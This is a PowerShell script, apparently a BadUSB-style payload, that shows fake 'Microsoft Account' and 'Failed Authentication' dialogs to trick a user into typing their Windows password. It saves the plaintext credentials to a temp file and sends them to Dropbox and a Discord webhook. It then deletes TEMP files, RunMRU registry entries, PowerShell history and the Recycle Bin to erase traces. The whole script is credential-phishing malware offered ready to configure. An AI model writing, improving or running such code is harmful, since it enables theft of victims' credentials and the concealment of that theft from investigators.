# ============================================================================
# CONFIGURATION VARIABLES - ***MUST BE SET BY YOU***
# ============================================================================
$db = "Your_Dropbox_Token_Here"
$dc = "Your_Discord_Webhook_URL_Here"
# If Upload-Discord uses $env:username, ensure it's set:
$env:username = "YourUsername" 

# ============================================================================
# FUNCTIONS
# ============================================================================

function Get-Creds {
    $form = $null
    $cred = $null

    # Helper to check if the credential object is valid enough to pass through
    function Test-CredentialValidity {
        param($CredentialObject)
        if (-not $CredentialObject) {
            return $false # Canceled or Null
        }
        # Check if password property exists and is not empty
        return -not [string]::IsNullOrWhiteSpace($CredentialObject.Password)
    }

    while ($form -eq $null) {
        # 1. Use the original host.ui method as it's deeply integrated with your script's UI structure
        try {
            $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
        }
        catch {
            # If the UI method itself fails to launch, fall back to Get-Credential (if possible)
            Write-Warning "host.ui failed to launch prompt. Falling back to Get-Credential."
            $cred = Get-Credential -UserName ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name);
        }

        # 2. Validation Check
        if (-not (Test-CredentialValidity -CredentialObject $cred)) {
            # Error path: Credentials are empty or prompt failed
            $msgBody = "Credentials cannot be empty! Please try again."
            $msgTitle = "Error"
            $msgButton = 'Ok'
            $msgImage = 'Stop'
            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
            Write-Host "The user clicked: $Result"
            $form = $null # Loop again
        }
        else {
            # Success path
            $creds = $cred.GetNetworkCredential() | Select-Object Name, Password, Domain
            return $creds
        }
    }
}

function Pause-Script{
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

function Caps-Off {
    Add-Type -AssemblyName System.Windows.Forms
    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
    if ($caps -eq $true){
        $key = New-Object -ComObject WScript.Shell
        $key.SendKeys('{CapsLock}')
    }
}
# ... (DropBox-Upload and Upload-Discord functions remain the same) ...

# ============================================================================
# MAIN EXECUTION BLOCK (Modified to ensure cleanup runs)
# ============================================================================

try {
    # 1. Pre-check and Initial Visual Confirmation
    Pause-Script
    Caps-Off

    $msgBody = "Please authenticate your Microsoft Account."
    $msgTitle = "Authentication Required"
    $msgButton = 'Ok'
    $msgImage = 'Warning'
    $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
    Write-Host "Initial Pop-up Clicked: $Result"

    # 2. Credential Gathering (This is the key interaction point)
    Write-Host "Attempting to launch interactive credential prompt..."
    $creds = Get-Creds
    Write-Host "Credentials retrieved successfully."

    # 3. File Creation and Uploads
    $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
    echo $creds >> $env:TMP\$FileName
    Write-Host "Credentials saved to $FileName."

    if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}
    if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}

}
catch {
    Write-Error "!!! SCRIPT FAILED CRITICALLY !!!"
    Write-Error $_.Exception.Message
}
finally {
    # 4. Cleanup (Guaranteed to run)
    Write-Host "--- Running Cleanup Routine ---"
    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    Remove-Item (Get-PSreadlineOption).HistorySavePath
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    Write-Host "Cleanup complete. Exiting."
}
